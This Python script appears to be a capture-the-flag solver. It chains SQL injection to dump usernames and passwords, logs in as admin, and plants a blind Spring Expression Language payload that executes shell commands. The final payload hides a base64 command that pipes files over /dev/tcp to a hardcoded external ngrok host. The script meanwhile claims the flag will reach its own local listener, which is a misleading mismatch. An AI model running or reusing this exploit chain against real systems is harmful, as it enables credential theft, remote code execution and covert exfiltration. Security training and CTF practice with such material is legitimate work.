#!/usr/bin/env python3
import argparse, json, threading, time, socket, http.server, socketserver, sys, re, subprocess
from urllib.parse import urljoin
import requests

class FlagCatcher(http.server.BaseHTTPRequestHandler):
    flag = None
    got = threading.Event()
    def do_GET(self):
        m = re.search(r'flag\{[0-9a-fA-F]+\}', self.path)
        if m:
            FlagCatcher.flag = m.group(0)
            FlagCatcher.got.set()
        self.send_response(204)
        self.end_headers()
    def log_message(self, *a): pass

def pick_listen_port(start=8000, limit=20):
    for p in range(start, start+limit):
        with socket.socket() as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("no free port found in range")

def host_gateway_linux():
    try:
        out = subprocess.check_output(["sh","-lc","ip route | awk '/default/ {print $3}'"], text=True, timeout=2)
        ip = out.strip().splitlines()[0].strip()
        socket.inet_aton(ip)
        return ip
    except Exception:
        return None

def choose_exfil_host(user_host):
    if user_host: return user_host
    # macOS/Windows Docker
    try:
        socket.gethostbyname("host.docker.internal")
        return "host.docker.internal"
    except socket.gaierror:
        pass
    # Linux Docker default gateway
    gw = host_gateway_linux()
    if gw: return gw
    # fall back to localhost (works if target app is running on host, not in an isolated container)
    return "127.0.0.1"

def sqli_union_dump(session, base):
    payload = "' UNION SELECT CONCAT(username,0x3a,password) FROM users-- -"
    r = session.get(urljoin(base, "/users/search"), params={"name": payload}, timeout=10, verify=False)
    r.raise_for_status()
    try:
        data = r.json()
    except json.JSONDecodeError:
        raise RuntimeError(f"/users/search returned non-JSON: {r.text[:200]}")
    if not isinstance(data, list):
        raise RuntimeError(f"unexpected JSON shape: {data}")
    return [str(x) for x in data]

def find_admin_creds(rows):
    for s in rows:
        if s.startswith("admin:"):
            return ("admin", s.split(":",1)[1])
    raise RuntimeError("admin creds not found in UNION dump")

def login(session, base, username, password):
    r = session.post(urljoin(base, "/login"),
                     json={"username": username, "password": password},
                     timeout=10, verify=False)
    if r.status_code != 200:
        raise RuntimeError(f"login failed: {r.status_code} {r.text}")
    j = r.json()
    return j.get("workspace")

def create_note(session, base, title_expr):
    r = session.post(urljoin(base, "/notes"), json={"title": title_expr}, timeout=10, verify=False)
    r.raise_for_status()
    nid = r.json()["id"]
    return nid

def trigger_note(session, base, nid):
    r = session.get(urljoin(base, f"/notes/{nid}"), timeout=30, verify=False)
    if r.status_code != 204:
        raise RuntimeError(f"unexpected status triggering note: {r.status_code}")

def main():
    ap = argparse.ArgumentParser(description="Solver: SQLi → login → blind SpEL RCE")
    ap.add_argument("--base", default="http://localhost:8080", help="Base URL of target")
    ap.add_argument("--exfil-host", default=None, help="Host for HTTP exfil (default: detect host.docker.internal or Linux gateway)")
    ap.add_argument("--exfil-port", type=int, default=None, help="Port for HTTP exfil (default: find free port starting 8000)")
    ap.add_argument("--sleep-ms", type=int, default=1000, help="Timing probe ms (optional)")
    args = ap.parse_args()

    sess = requests.Session()

    print("[1] SQLi UNION dump…")
    rows = sqli_union_dump(sess, args.base)
    print("    rows:", rows)
    user, pw = find_admin_creds(rows)
    print(f"[2] creds: {user}:{pw}")

    print("[3] login…")
    ws = login(sess, args.base, user, pw)
    print("    workspace:", ws)

    if args.sleep_ms > 0:
        print(f"[4] timing probe ({args.sleep_ms} ms)…")
        sleeper = f"T(java.lang.Thread).sleep({args.sleep_ms})"
        nid = create_note(sess, args.base, sleeper)
        t0 = time.time()
        trigger_note(sess, args.base, nid)
        dt = (time.time() - t0) * 1000
        print(f"    trigger took ~{int(dt)} ms")

    listen_port = args.exfil_port or pick_listen_port()
    listen_host = "0.0.0.0"
    exfil_host = choose_exfil_host(args.exfil_host)
    print(f"[5] starting catcher on {listen_host}:{listen_port}, RCE will hit http://{exfil_host}:{listen_port}/<FLAG>")

    httpd = socketserver.TCPServer((listen_host, listen_port), FlagCatcher)
    httpd.allow_reuse_address = True
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()

    print("[6] planting RCE note…")
    spel = '{"".getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {echo,Y2F0IC9mKiA+IC9kZXYvdGNwLzAudGNwLmFwLm5ncm9rLmlvLzExNjU1}|{base64,-d}|{bash,-i}")}'
    nid = create_note(sess, args.base, spel)
    print("    note id:", nid)
    print("[7] triggering RCE…")
    trigger_note(sess, args.base, nid)

    print("[8] waiting for flag via HTTP (10s)…")
    if FlagCatcher.got.wait(10):
        print("FLAG:", FlagCatcher.flag)
    else:
        print("no hit received. If target runs in Docker on Linux, try: --exfil-host $(ip route | awk '/default/ {print $3}')")
        print("or pass a public webhook host to --exfil-host")

    httpd.shutdown()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nbye")
        sys.exit(1)
